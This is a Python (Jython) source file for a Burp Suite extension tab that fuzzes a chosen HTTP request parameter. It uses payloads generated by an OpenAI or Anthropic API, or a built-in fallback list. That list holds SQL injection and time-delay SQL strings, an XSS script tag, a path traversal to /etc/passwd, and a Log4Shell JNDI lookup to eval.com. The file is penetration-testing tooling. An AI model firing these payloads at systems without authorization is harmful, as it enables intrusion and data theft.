# -*- coding: utf-8 -*-
"""
LLMFuzzerTab.py - Tab 2: LLM Context Fuzzer
Handles parameter extraction, masked API key handling, prompt header redaction,
remote API opt-in checks, multi-provider API calls (OpenAI & Anthropic),
and two-phase payload generation & fuzz execution.
"""

import threading
import json

try:
    import urllib2
except ImportError:
    import urllib.request as urllib2

from java.awt import BorderLayout, FlowLayout, Dimension, GridLayout
from javax.swing import (
    JPanel, JButton, JLabel, JTextField, JPasswordField, JCheckBox, JTextArea,
    JTable, JScrollPane, JSplitPane, JComboBox, JSeparator, SwingUtilities,
    JOptionPane, BorderFactory
)
from javax.swing.table import DefaultTableModel

from ApexToolkitLogic import LLMFuzzerEngine

class LLMFuzzerTab(object):
    def __init__(self, callbacks, helpers):
        self.callbacks = callbacks
        self.helpers = helpers
        self.current_http_service = None
        self.current_request_bytes = None
        self.extracted_params = []
        self.fuzz_results = [] # stores (payload, status, length, req_resp_obj)
        self.results_lock = threading.Lock()

        self._init_ui()

    def _init_ui(self):
        self.panel = JPanel(BorderLayout())

        # Top Configuration Bar
        top_container = JPanel(BorderLayout())

        config_panel = JPanel(FlowLayout(FlowLayout.LEFT, 8, 5))

        lbl_title = JLabel("LLM Context Fuzzer")
        font = lbl_title.getFont()
        if font:
            lbl_title.setFont(font.deriveFont(font.getStyle() | 1, 14.0))

        config_panel.add(lbl_title)
        config_panel.add(JSeparator(1))

        config_panel.add(JLabel("API Key:"))
        self.txt_api_key = JPasswordField("", 12)
        config_panel.add(self.txt_api_key)

        config_panel.add(JLabel("Model:"))
        self.txt_model = JTextField("gpt-3.5-turbo", 10)
        config_panel.add(self.txt_model)

        config_panel.add(JLabel("API Endpoint:"))
        self.txt_api_url = JTextField("https://api.openai.com/v1/chat/completions", 20)
        config_panel.add(self.txt_api_url)

        config_panel.add(JLabel("Target Param:"))
        self.combo_params = JComboBox()
        self.combo_params.setPreferredSize(Dimension(140, 25))
        config_panel.add(self.combo_params)

        # Opt-in check for sending data to external APIs
        optin_panel = JPanel(FlowLayout(FlowLayout.LEFT, 8, 2))
        self.chk_allow_remote = JCheckBox("Allow Sending Redacted Request Context to Third-Party API", False)
        self.btn_generate = JButton("1. Generate Payloads", actionPerformed=self._on_generate_payloads)
        self.btn_fire = JButton("2. Fire Payloads", actionPerformed=self._on_fire_payloads)

        optin_panel.add(self.chk_allow_remote)
        optin_panel.add(self.btn_generate)
        optin_panel.add(self.btn_fire)

        top_container.add(config_panel, BorderLayout.NORTH)
        top_container.add(optin_panel, BorderLayout.SOUTH)

        # Center Section: Left = Request Editor & Generated Payloads, Right = Results & Response Inspector
        self.req_editor = self.callbacks.createMessageEditor(None, True)

        payload_panel = JPanel(BorderLayout())
        payload_panel.setBorder(BorderFactory.createTitledBorder(" Generated Fuzz Payloads (Editable) "))
        self.txt_payloads = JTextArea(6, 30)
        payload_scroll = JScrollPane(self.txt_payloads)
        payload_panel.add(payload_scroll, BorderLayout.CENTER)

        left_split = JSplitPane(JSplitPane.VERTICAL_SPLIT, self.req_editor.getComponent(), payload_panel)
        left_split.setResizeWeight(0.6)

        left_panel = JPanel(BorderLayout())
        left_panel.add(JLabel(" Base Target Request"), BorderLayout.NORTH)
        left_panel.add(left_split, BorderLayout.CENTER)

        # Right side: Results Table + Request/Response Viewer
        self.results_table_model = DefaultTableModel(["Payload", "Status", "Content Length"], 0)
        self.results_table = JTable(self.results_table_model)
        self.results_table.getSelectionModel().addListSelectionListener(self._on_row_selected)

        res_scroll = JScrollPane(self.results_table)

        # Response viewer for selected fuzz item
        self.resp_editor = self.callbacks.createMessageEditor(None, False)

        right_split = JSplitPane(JSplitPane.VERTICAL_SPLIT, res_scroll, self.resp_editor.getComponent())
        right_split.setResizeWeight(0.5)

        main_split = JSplitPane(JSplitPane.HORIZONTAL_SPLIT, left_panel, right_split)
        main_split.setResizeWeight(0.45)

        self.panel.add(top_container, BorderLayout.NORTH)
        self.panel.add(main_split, BorderLayout.CENTER)

    def get_component(self):
        return self.panel

    def set_target_request(self, http_service, request_bytes):
        """
        Called when a request is sent to LLM Fuzzer via context menu or loaded into editor.
        """
        self.current_http_service = http_service
        self.current_request_bytes = request_bytes
        self.req_editor.setMessage(request_bytes, True)

        raw_req = self.helpers.bytesToString(request_bytes)
        self.extracted_params = LLMFuzzerEngine.extract_parameters(raw_req)

        def update_params_combo():
            self.combo_params.removeAllItems()
            if self.extracted_params:
                for p in self.extracted_params:
                    self.combo_params.addItem(p['name'] + " (" + p['type'] + ")")
            else:
                self.combo_params.addItem("No Params Found")

        SwingUtilities.invokeLater(update_params_combo)

    def _get_selected_param_name(self):
        selected_param_idx = self.combo_params.getSelectedIndex()
        if selected_param_idx < 0 or selected_param_idx >= len(self.extracted_params):
            return str(self.combo_params.getSelectedItem() or "param")
        return self.extracted_params[selected_param_idx]['name']

    def _on_generate_payloads(self, event):
        req_bytes = self.req_editor.getMessage()
        if not req_bytes or not self.current_http_service:
            JOptionPane.showMessageDialog(self.panel, "Please set a target request first.")
            return

        param_name = self._get_selected_param_name()
        api_key = str(self.txt_api_key.getPassword()).strip()
        api_url = self.txt_api_url.getText().strip()
        model_name = self.txt_model.getText().strip() or "gpt-3.5-turbo"
        allow_remote = self.chk_allow_remote.isSelected()

        if allow_remote and not api_key:
            JOptionPane.showMessageDialog(self.panel, "Remote API opt-in is enabled, but no API Key was provided. Please enter an API Key.")
            return

        self.btn_generate.setEnabled(False)

        # Async payload generation
        t = threading.Thread(
            target=self._generate_worker_thread,
            args=(req_bytes, param_name, api_key, api_url, model_name, allow_remote)
        )
        t.daemon = True
        t.start()

    def _generate_worker_thread(self, req_bytes, param_name, api_key, api_url, model_name, allow_remote):
        try:
            raw_req = self.helpers.bytesToString(req_bytes)
            payloads = []

            if allow_remote and api_key:
                payloads = self._call_llm_api(param_name, raw_req, api_key, api_url, model_name)

            if not payloads:
                # Local smart fallback payloads
                payloads = [
                    "' OR '1'='1",
                    "\" OR \"1\"=\"1",
                    "<script>alert('xss')</script>",
                    "../../../../etc/passwd",
                    "${jndi:ldap://eval.com/a}",
                    "'; WAITFOR DELAY '0:0:5'--",
                    "1; SELECT pg_sleep(5)"
                ]

            def update_payload_text():
                self.txt_payloads.setText("\n".join(payloads))

            SwingUtilities.invokeLater(update_payload_text)

        finally:
            def reenable():
                self.btn_generate.setEnabled(True)
            SwingUtilities.invokeLater(reenable)

    def _on_fire_payloads(self, event):
        req_bytes = self.req_editor.getMessage()
        if not req_bytes or not self.current_http_service:
            JOptionPane.showMessageDialog(self.panel, "Please set a target request first.")
            return

        payload_text = self.txt_payloads.getText().strip()
        if not payload_text:
            JOptionPane.showMessageDialog(self.panel, "No payloads found in the payloads box. Please generate or enter payloads first.")
            return

        payloads = [line.strip() for line in payload_text.splitlines() if line.strip()]
        param_name = self._get_selected_param_name()

        self.btn_fire.setEnabled(False)
        self.results_table_model.setRowCount(0)
        with self.results_lock:
            self.fuzz_results = []

        t = threading.Thread(
            target=self._fire_worker_thread,
            args=(req_bytes, param_name, payloads)
        )
        t.daemon = True
        t.start()

    def _fire_worker_thread(self, req_bytes, param_name, payloads):
        try:
            raw_req = self.helpers.bytesToString(req_bytes)

            for payload in payloads:
                mutated_req_str = LLMFuzzerEngine.inject_payload(raw_req, param_name, payload)
                mutated_bytes = self.helpers.stringToBytes(mutated_req_str)

                try:
                    resp = self.callbacks.makeHttpRequest(self.current_http_service, mutated_bytes)
                    status = "N/A"
                    length = "N/A"
                    if resp and resp.getResponse():
                        resp_info = self.helpers.analyzeResponse(resp.getResponse())
                        status = str(resp_info.getStatusCode())
                        length = str(len(resp.getResponse()))

                    with self.results_lock:
                        self.fuzz_results.append((payload, status, length, resp))

                    def add_row(p=payload, s=status, l=length):
                        self.results_table_model.addRow([p, s, l])

                    SwingUtilities.invokeLater(add_row)
                except Exception as ex:
                    err_status = "ERROR"
                    err_length = str(ex)
                    with self.results_lock:
                        self.fuzz_results.append((payload, err_status, err_length, None))

                    def add_err_row(p=payload, s=err_status, l=err_length):
                        self.results_table_model.addRow([p, s, l])

                    SwingUtilities.invokeLater(add_err_row)

        finally:
            def reenable():
                self.btn_fire.setEnabled(True)
            SwingUtilities.invokeLater(reenable)

    def _call_llm_api(self, param_name, raw_req, api_key, api_url, model_name):
        prompt = LLMFuzzerEngine.build_prompt(param_name, raw_req)
        try:
            is_anthropic = "anthropic.com" in api_url.lower()

            if is_anthropic:
                headers = {
                    "Content-Type": "application/json",
                    "x-api-key": api_key,
                    "anthropic-version": "2023-06-01"
                }
                body_data = {
                    "model": model_name,
                    "max_tokens": 1000,
                    "messages": [
                        {"role": "user", "content": prompt}
                    ]
                }
            else:
                # OpenAI or OpenAI-compatible format
                headers = {
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + api_key
                }
                body_data = {
                    "model": model_name,
                    "messages": [
                        {"role": "user", "content": prompt}
                    ],
                    "temperature": 0.7
                }

            req = urllib2.Request(api_url, json.dumps(body_data), headers)
            res = urllib2.urlopen(req, timeout=12)
            json_resp = json.loads(res.read().decode('utf-8'))

            if is_anthropic and 'content' in json_resp and json_resp['content']:
                text_content = json_resp['content'][0].get('text', '')
                return LLMFuzzerEngine.parse_llm_payloads(text_content)
            elif 'choices' in json_resp and json_resp['choices']:
                content = json_resp['choices'][0]['message']['content']
                return LLMFuzzerEngine.parse_llm_payloads(content)

        except Exception as ex:
            print("LLM API Call Error: " + str(ex))

        return []

    def _on_row_selected(self, event):
        if event.getValueIsAdjusting():
            return
        row = self.results_table.getSelectedRow()
        resp_obj = None
        with self.results_lock:
            if 0 <= row < len(self.fuzz_results):
                resp_obj = self.fuzz_results[row][3]

        if resp_obj and resp_obj.getResponse():
            self.resp_editor.setMessage(resp_obj.getResponse(), False)
        else:
            self.resp_editor.setMessage(self.helpers.stringToBytes("No Response Recorded"), False)
